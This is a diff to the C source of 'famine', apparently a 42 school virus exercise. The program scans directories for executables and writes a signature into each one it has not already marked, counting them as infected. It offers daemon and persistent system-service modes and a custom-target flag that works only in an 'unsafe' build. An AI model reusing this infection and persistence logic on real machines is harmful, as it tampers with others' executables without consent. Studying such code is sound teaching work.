@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
-/*   Updated: 2024/08/03 21:48:58 by mgama            ###   ########.fr       */
+/*   Updated: 2024/09/25 21:56:48 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,6 +20,7 @@
 struct s_famine g_famine;
 int g_exit = 0;
 size_t count = 0;
+size_t infected = 0;
 
 const struct s_famine_magics magics[] = {
 	// EXECUTABLES
@@ -56,6 +57,9 @@ int get_terminal_width() {
 	return w.ws_col;
 }
 
+/**
+ * Remove the last line of the standard output
+ */
 void cut_last_line(int text_length)
 {
 	int term_width = get_terminal_width() + 1;
@@ -65,11 +69,17 @@ void cut_last_line(int text_length)
 	}
 }
 
+/**
+ * Release the shared memory segment use to check if another instance of `famine` is running
+ */
 void remove_shm(void)
 {
 	shmctl(shmget(FM_SHM_KEY, sizeof(int), 0666), IPC_RMID, NULL);
 }
 
+/**
+ * Check if another instance of `famine` is running
+ */
 int is_running(void)
 {
 	/**
@@ -78,11 +88,14 @@ int is_running(void)
 	 */
 	int shmid = shmget(FM_SHM_KEY, sizeof(int), IPC_CREAT | IPC_EXCL | 0666);
 	if (shmid == -1) {
-		return 1;
+		return (1);
 	}
-	return 0;
+	return (0);
 }
 
+/**
+ * Write back the file and release the memory
+ */
 int	write_back_prog(void)
 {
 	ft_verbose("\n%sWriting back the program%s\n", B_GREEN, RESET);
@@ -98,12 +111,29 @@ int	write_back_prog(void)
 	return (0);
 }
 
+/**
+ * For all stop signals, the program should stop in a clean way.
+ */
 void interruptHandler(int sig)
 {
 	(void)sig;
+	printf("\b\b \b\b");
 	g_exit = 1;
 }
 
+/**
+ * Because the program canoot set any variable when crashing and catching
+ * error signals (SIGSEGV, SIGILL, etc.) the program should exit in a clean way.
+ */
+void errorHandler(int sig)
+{
+	(void)sig;
+	exit(0);
+}
+
+/**
+ * Check if the given `buf` contains any of the many numbers list
+ */
 int	is_magic(const char *buf, const struct s_famine_magics *magic)
 {
 	for (size_t i = 0; magic[i].len != 0; i++)
@@ -116,12 +146,16 @@ int	is_magic(const char *buf, const struct s_famine_magics *magic)
 	return (0);
 }
 
-void famine(char *target, char *parent)
+/**
+ * Return either 0 or 1 if the file has been checked
+ */
+int famine(char *target, char *parent)
 {
 	struct stat statbuf;
 	char full_path[FM_PATH_MAX];
 
 	bzero(full_path, FM_PATH_MAX);
+
 	if (parent != NULL)
 	{
 		strcpy(full_path, parent);
@@ -130,28 +164,28 @@ void famine(char *target, char *parent)
 	strcat(full_path, target);
 
 	if (lstat(full_path, &statbuf) == -1)
-		return ;
+		return (0);
 
 	/**
 	 * Prevent from following file symlink
 	 */
 	if (S_ISLNK(statbuf.st_mode))
-		return ;
+		return (0);
 
 	if (S_ISDIR(statbuf.st_mode))
-		return ;
+		return (0);
 
 	ft_verbose("%d: Checking %s%s%s\n", count, B_YELLOW, full_path, RESET);
 	count++;
 
 #ifdef __APPLE__
 	if (is_icloud_file(full_path))
-		return ;
+		return (1);
 #endif /* __APPLE__ */
 
 	int fd = open(full_path, O_RDWR);
 	if (fd == -1) {
-		return ;
+		return (1);
 	}
 	char buf[magic_size];
 	size_t n = read(fd, buf, magic_size);
@@ -159,13 +193,13 @@ void famine(char *target, char *parent)
 	if (n <= 0 || n < magic_size)
 	{
 		close(fd);
-		return ;
+		return (1);
 	}
 
 	if (is_magic(buf, magics) == 0)
 	{
 		close(fd);
-		return ;
+		return (1);
 	}
 
 	char sign_buf[sizeof(signature)];
@@ -177,17 +211,17 @@ void famine(char *target, char *parent)
 	if (n <= 0 || n < sizeof(signature))
 	{
 		close(fd);
-		return ;
+		return (1);
 	}
 
 	size_t i = 0;
-	while (signature[i] == sign_buf[i] && i < sizeof(signature))
+	while (signature[i] == sign_buf[i] && i < sizeof(signature) && g_exit == 0)
 		i++;
 
 	if (i == sizeof(signature))
 	{
 		close(fd);
-		return ;
+		return (1);
 	}
 
 	cut_last_line(verbose_size);
@@ -196,6 +230,8 @@ void famine(char *target, char *parent)
 	lseek(fd, pos, SEEK_SET);
 	write(fd, signature, sizeof(signature));
 	close(fd);
+	infected++;
+	return (1);
 }
 
 void	custom_target(char *target, char *parent, int recursive, int recursive_depth)
@@ -231,11 +267,11 @@ void	custom_target(char *target, char *parent, int recursive, int recursive_dept
 	 * Prevent from following dir symlink
 	 */
 	if (S_ISLNK(statbuf.st_mode))
-		return ;
+		return;
 	if (S_ISREG(statbuf.st_mode))
 	{
-		famine(full_path, NULL);
-		cut_last_line(verbose_size);
+		if (famine(full_path, NULL))
+			cut_last_line(verbose_size);
 		return;
 	}
 	dir = opendir(full_path);
@@ -251,11 +287,23 @@ void	custom_target(char *target, char *parent, int recursive, int recursive_dept
 			custom_target(d->d_name, full_path, recursive, recursive_depth);
 			continue;
 		}
-		famine(d->d_name, full_path);
-		cut_last_line(verbose_size);
+		if (famine(d->d_name, full_path))
+			cut_last_line(verbose_size);
 	}
 	closedir(dir);
 }
+
+/**
+ * Program options
+ * 
+ * - d, daemon: daemonize the program (anonymous daemon, not persistant)
+ * - s, add-service: daemonize the program (add to system services, persistant)
+ * - m, multi-instances: allow running multiple instances in the same time
+ * - o, once: execute the infection process only one time
+ * - r, recursive: if the target is a directory, infect recursively all the sub-directories (does not follow links)
+ * - v, verbose: verbose output (not recommended)
+ * - iknowwhatiamdoing: specify cutsom target (default is FM_TARGET), can only be used with compilation flag FM_SECURITY=0 (make unsafe)
+ */
 
 int main(int argc, char **argv, char *const * envp)
 {
@@ -268,8 +316,8 @@ int main(int argc, char **argv, char *const * envp)
 	struct getopt_list_s optlist[] = {
 		{"daemon", 'd', OPTPARSE_NONE},
 		{"add-service", 's', OPTPARSE_NONE},
-		{"once", 'o', OPTPARSE_NONE},
 		{"multi-instances", 'm', OPTPARSE_NONE},
+		{"once", 'o', OPTPARSE_NONE},
 		{"recursive", 'r', OPTPARSE_OPTIONAL},
 		{no_xsec, 0, OPTPARSE_REQUIRED},
 		{"verbose", 'v', OPTPARSE_NONE},
@@ -322,7 +370,7 @@ int main(int argc, char **argv, char *const * envp)
 	}
 
 	if (argc - options.optind != 0)
-		return 0;
+		return (0);
 
 	ft_verbose("\n%s<== Verbose mode activated ==>%s\n\n", B_RED, RESET);
 
@@ -340,7 +388,7 @@ int main(int argc, char **argv, char *const * envp)
 
 	int fd = open(argv[0], O_RDONLY);
 	if (fd < 0)
-		return 0;
+		return (0);
 
 	if (fstat(fd, &stats) < 0)
 		return (0);
@@ -397,11 +445,18 @@ int main(int argc, char **argv, char *const * envp)
 	ft_verbose("Setting up signals handler\n");
 	/**
 	 * Catch kill signals to prevent segfaults.
+	 * Since kill (9) cannot be caught if this signal is sent the program will be lost (unless it was started with system service)
 	 */
 	signal(SIGINT, interruptHandler);
 	signal(SIGQUIT, interruptHandler);
 	signal(SIGTERM, interruptHandler);
-	signal(SIGSEGV, interruptHandler);
+	/**
+	 * Catch error signals.
+	 */
+	signal(SIGSEGV, errorHandler);
+	signal(SIGABRT, errorHandler);
+	signal(SIGILL, errorHandler);
+	signal(SIGBUS, errorHandler);
 
 	/**
 	 * Remove the `/` at the end of the target path if it exists
@@ -418,6 +473,7 @@ int main(int argc, char **argv, char *const * envp)
 	do
 	{
 		count = 0;
+		infected = 0;
 		ft_verbose("New infection cycle\n");
 		if (option & F_CUSTOM)
 		{
@@ -429,6 +485,7 @@ int main(int argc, char **argv, char *const * envp)
 		}
 
 		ft_verbose("\n%d files checked !\n", count);
+		ft_verbose("%d files infected !\n", infected);
 
 		if (option & F_ONCE)
 			break;
